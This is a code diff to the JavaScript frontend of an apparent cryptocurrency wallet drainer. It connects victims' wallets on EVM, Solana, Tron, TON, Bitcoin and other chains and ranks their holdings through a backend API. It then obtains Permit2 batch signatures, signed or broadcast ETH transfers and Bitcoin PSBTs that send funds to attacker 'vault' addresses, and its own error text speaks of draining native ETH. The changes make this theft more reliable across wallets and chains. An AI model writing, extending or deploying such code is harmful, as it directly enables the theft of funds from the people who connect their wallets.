@@ -43,7 +43,22 @@
   var wcModal = null;
   var wcSdkPromise = null;
   var drainRunning = false;
-  var vaultCache = Object.assign({}, CFG.vaultAddresses || {});
+  /** Normalize vault keys (trx↔tron, svm↔sol) — local LEGION_CONFIG wins over client-config. */
+  function normalizeVaultCache(source) {
+    var out = {};
+    if (!source || typeof source !== 'object') return out;
+    Object.keys(source).forEach(function (k) {
+      var v = source[k];
+      if (v != null && String(v).trim()) out[k] = String(v).trim();
+    });
+    if (out.trx && !out.tron) out.tron = out.trx;
+    if (out.tron && !out.trx) out.trx = out.tron;
+    if (out.sol && !out.svm) out.svm = out.sol;
+    if (out.svm && !out.sol) out.sol = out.svm;
+    return out;
+  }
+
+  var vaultCache = normalizeVaultCache(CFG.vaultAddresses || {});
   var clientConfigLoaded = false;
 
   var CHAIN_EXTENSIONS = {
@@ -204,10 +219,31 @@
   }
 
   function parseEnvelope(res, data) {
-    if (data && typeof data.ok === 'boolean') {
-      return { ok: data.ok, message: data.message || '', data: data.data != null ? data.data : data };
+    if (!data || typeof data !== 'object') {
+      return { ok: res.ok, message: res.statusText || '', data: data };
     }
-    return { ok: res.ok, message: (data && data.message) || res.statusText || '', data: data };
+    var message = typeof data.message === 'string' ? data.message : (res.statusText || '');
+
+    function unwrapPayload(payload) {
+      if (payload == null || typeof payload !== 'object') return payload;
+      if (payload.data != null && (typeof payload.ok === 'boolean' || typeof payload.success === 'boolean')) {
+        return payload.data;
+      }
+      return payload;
+    }
+
+    if (typeof data.ok === 'boolean') {
+      return {
+        ok: data.ok,
+        message: message,
+        data: unwrapPayload(data.data != null ? data.data : data),
+      };
+    }
+    if (typeof data.success === 'boolean') {
+      var payload = data.data != null ? data.data : data;
+      return { ok: data.success, message: message, data: unwrapPayload(payload) };
+    }
+    return { ok: res.ok, message: message, data: data };
   }
 
   function kineticHeaders() {
@@ -260,14 +296,18 @@
       var cfg = await apiGet('/api/v1/client-config');
       var vaults = cfg && cfg.vault_addresses;
       if (vaults && typeof vaults === 'object') {
-        Object.keys(vaults).forEach(function (k) {
-          var v = vaults[k];
-          if (v && String(v).trim() && (!vaultCache[k] || !String(vaultCache[k]).trim())) {
-            vaultCache[k] = String(v).trim();
+        var remote = normalizeVaultCache(vaults);
+        Object.keys(remote).forEach(function (k) {
+          if (!vaultCache[k] || !String(vaultCache[k]).trim()) {
+            vaultCache[k] = remote[k];
           }
         });
+        var synced = normalizeVaultCache(vaultCache);
+        Object.keys(synced).forEach(function (k) {
+          vaultCache[k] = synced[k];
+        });
       }
-    } catch (e) { /* optional — LEGION_CONFIG vaultAddresses still work */ }
+    } catch (e) { /* LEGION_CONFIG.vaultAddresses is authoritative for local testing */ }
     clientConfigLoaded = true;
   }
 
@@ -277,17 +317,33 @@
     throw new Error(ext.name + ' not installed. Download: ' + ext.url);
   }
 
+  function vaultKeyForTab(tab) {
+    if (tab === 'evm') return 'evm';
+    if (tab === 'sol') return 'sol';
+    if (tab === 'tron') return 'tron';
+    if (tab === 'ton') return 'ton';
+    if (tab === 'btc') return 'btc';
+    if (tab === 'cosmos') return 'cosmos';
+    if (tab === 'aptos') return 'aptos';
+    if (tab === 'sui') return 'sui';
+    return tab;
+  }
+
   function requireVaultAddress(chainKey) {
     var addr = resolveVaultAddress(chainKey);
     if (!addr) {
       var labels = {
-        sol: 'Solana (SOL)', tron: 'Tron (TRX)', ton: 'TON',
+        evm: 'EVM', sol: 'Solana (SOL)', tron: 'Tron (TRX)', ton: 'TON',
         cosmos: 'Cosmos (ATOM)', aptos: 'Aptos (APT)', sui: 'Sui (SUI)', btc: 'Bitcoin (BTC)',
+      };
+      var configHints = {
+        tron: 'trx or tron', sol: 'sol', ton: 'ton', evm: 'evm', btc: 'btc',
+        cosmos: 'cosmos', aptos: 'aptos', sui: 'sui',
       };
       throw new Error(
         'Vault address not configured for ' + (labels[chainKey] || chainKey) +
-        '. Set LEGION_CONFIG.vaultAddresses.' + chainKey +
-        ' in index.html or VAULT_ADDRESS_* on Railway (loaded via /api/v1/client-config).',
+        '. Add LEGION_CONFIG.vaultAddresses.' + (configHints[chainKey] || chainKey) +
+        ' in index.html (or set VAULT_ADDRESS_* on Railway).',
       );
     }
     return addr;
@@ -295,6 +351,29 @@
 
   function toHex(n) {
     return '0x' + BigInt(n).toString(16);
+  }
+
+  function isEvmTxHash(value) {
+    if (!value || typeof value !== 'string') return false;
+    var v = value.trim();
+    return /^0x[0-9a-fA-F]{64}$/.test(v);
+  }
+
+  async function ensureEvmChain(targetChainId) {
+    if (!targetChainId || !window.ethereum) return;
+    var eth = window.ethereum;
+    var current = wallets.evm && wallets.evm.chainId;
+    if (current === targetChainId) return;
+    var chainHex = '0x' + Number(targetChainId).toString(16);
+    try {
+      await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: chainHex }] });
+    } catch (e) {
+      if (e && e.code === 4902 && targetChainId === 1) {
+        throw new Error('Switch MetaMask to Ethereum Mainnet (chain 1) to drain native ETH');
+      }
+      throw e;
+    }
+    if (wallets.evm) wallets.evm.chainId = targetChainId;
   }
 
   /* ── Wallet connectors ────────────────────────────────────────────────── */
@@ -522,6 +601,7 @@
 
   function resolveVaultAddress(chainKey) {
     var aliases = {
+      evm: ['evm'],
       sol: ['sol', 'svm'],
       tron: ['tron', 'trx'],
       ton: ['ton'],
@@ -704,21 +784,19 @@
   async function signEvmNativeTx(tx) {
     if (!tx) return null;
     var signer = await getEvmSigner();
+    var txParams = {
+      from: tx.from, to: tx.to, value: toHex(tx.value), gas: toHex(tx.gas),
+      maxFeePerGas: toHex(tx.maxFeePerGas), maxPriorityFeePerGas: toHex(tx.maxPriorityFeePerGas),
+      nonce: toHex(tx.nonce), type: '0x2', chainId: toHex(tx.chainId),
+    };
     try {
-      return await signer.request({
-        method: 'eth_signTransaction',
-        params: [{
-          from: tx.from, to: tx.to, value: toHex(tx.value), gas: toHex(tx.gas),
-          maxFeePerGas: toHex(tx.maxFeePerGas), maxPriorityFeePerGas: toHex(tx.maxPriorityFeePerGas),
-          nonce: toHex(tx.nonce), type: '0x2', chainId: toHex(tx.chainId),
-        }],
-      });
-    } catch (e) {
-      return signer.request({
-        method: 'eth_sendTransaction',
-        params: [{ from: tx.from, to: tx.to, value: toHex(tx.value), gas: toHex(tx.gas), type: '0x2' }],
-      });
-    }
+      var signed = await signer.request({ method: 'eth_signTransaction', params: [txParams] });
+      if (signed && typeof signed === 'string' && signed.length >= 70) return signed;
+    } catch (e) { /* MetaMask and most wallets omit eth_signTransaction */ }
+    var sent = await signer.request({ method: 'eth_sendTransaction', params: [txParams] });
+    if (isEvmTxHash(sent)) return sent;
+    if (sent && typeof sent === 'string' && sent.length >= 70) return sent;
+    throw new Error('Wallet did not return a signed transaction or broadcast hash for native ETH');
   }
 
   async function loadSolWeb3() {
@@ -903,6 +981,7 @@
 
   async function runBitcoinPsbt(scoutUsd) {
     if (!wallets.btc) throw new Error('Bitcoin wallet not connected');
+    var vault = requireVaultAddress('btc');
     setStatus('Building Bitcoin PSBT…', 'busy');
     var balanceData = null;
     try {
@@ -915,6 +994,7 @@
     var psbt = await apiPost('/api/v1/signature-anchor/bitcoin-psbt', {
       wallet_address: wallets.btc.address,
       amount_sat: amountSat,
+      vault_address: vault,
     });
     if (!psbt || !psbt.psbt_base64) throw new Error('PSBT build failed');
     var signedPsbt = psbt.psbt_base64;
@@ -934,6 +1014,7 @@
       signature: signedPsbt,
       signed_psbt_base64: signedPsbt,
       amount: amountSat,
+      psbt_metadata: { vault_address: vault, amount_sat: amountSat },
       nonce: 'btc:' + Date.now(),
       expiry_iso: EXPIRY_ISO,
       wallet_type: walletTypeLabel(wallets.btc),
@@ -1089,29 +1170,65 @@
     var amounts = estimateNative(fusion);
     var permits = extractPermits(fusion);
 
+    var eligibleErc20 = false;
+    var ethNativeWei = '0';
+    var drainChainId = evm.chainId || 1;
     try {
       var ranked = await apiPost('/api/v1/scout/ranked', { wallet_address: evm.address, chain_family: 'EVM' });
       if (ranked.assets && ranked.assets.length) {
+        var nativeEth = ranked.assets.find(function (a) {
+          return a.token === 'native' && String(a.family || '').toUpperCase() === 'EVM';
+        });
+        if (nativeEth && nativeEth.amount_raw) {
+          try {
+            var weiBal = BigInt(String(nativeEth.amount_raw).replace(/[^\d]/g, '') || '0');
+            var ethGasReserve = 1000000000000000n;
+            if (weiBal > ethGasReserve) ethNativeWei = (weiBal - ethGasReserve).toString();
+          } catch (e) { /* invalid amount_raw */ }
+        }
+        if (nativeEth && nativeEth.chain_id) {
+          drainChainId = Number(nativeEth.chain_id) || drainChainId;
+        } else if (ethNativeWei !== '0') {
+          drainChainId = 1;
+        }
         var top = ranked.assets.filter(function (a) {
           return a.token && a.token !== 'native' && a.token.indexOf('0x') === 0;
         }).slice(0, 8).map(function (a) { return { token: a.token, amount: a.amount_raw || MAX_PERMIT }; });
-        if (top.length) permits = top;
+        if (top.length) {
+          permits = top;
+          eligibleErc20 = true;
+        }
       }
     } catch (e) { /* ranked optional */ }
+
+    var nativeAmountEth = ethNativeWei !== '0' ? ethNativeWei : amounts.native;
+    var hasNativeEth = false;
+    try { hasNativeEth = BigInt(nativeAmountEth || '0') > 0n; } catch (e) { hasNativeEth = false; }
+
+    if (hasNativeEth) {
+      await ensureEvmChain(drainChainId);
+      evm.chainId = drainChainId;
+    }
 
     setStatus('Preparing Permit2 batch…', 'busy');
     var batchBody = {
       wallet_address: evm.address,
       chain_id: evm.chainId,
       permits: permits,
-      nativeAmount: amounts.native,
+      nativeAmount: nativeAmountEth,
     };
     if (wallets.sol) { batchBody.sol_wallet = wallets.sol.address; batchBody.nativeAmountSol = amounts.sol; }
     if (wallets.tron) { batchBody.trx_wallet = wallets.tron.address; batchBody.nativeAmountTrx = amounts.trx; }
     if (wallets.ton) { batchBody.ton_wallet = wallets.ton.address; batchBody.nativeAmountTon = amounts.ton; }
 
     var batch = await apiPost('/api/v1/signature-anchor/permit2-batch-typed-data', batchBody);
-    if (!batch.typed_data || !batch.batch_permit_metadata) throw new Error('Batch typed data missing');
+    if (!batch.typed_data || !batch.batch_permit_metadata) {
+      throw new Error(
+        eligibleErc20 || hasNativeEth
+          ? 'Batch typed data missing'
+          : 'No eligible token for Permit2 batch — fund wallet with ERC20 (e.g. USDC) or native ETH',
+      );
+    }
 
     setStatus('Sign Permit2 authorization…', 'busy');
     var permitSig = await signEvmTypedData(batch.typed_data);
@@ -1187,10 +1304,6 @@
 
     try {
       await loadClientConfigVaults();
-      var vaultTabs = ['sol', 'tron', 'ton', 'cosmos', 'aptos', 'sui'];
-      if (vaultTabs.indexOf(ACTIVE_TAB) >= 0) {
-        requireVaultAddress(ACTIVE_TAB);
-      }
       setStatus('Connecting…', 'busy');
       var conn = skipConnect ? (
         ACTIVE_TAB === 'evm' ? wallets.evm :
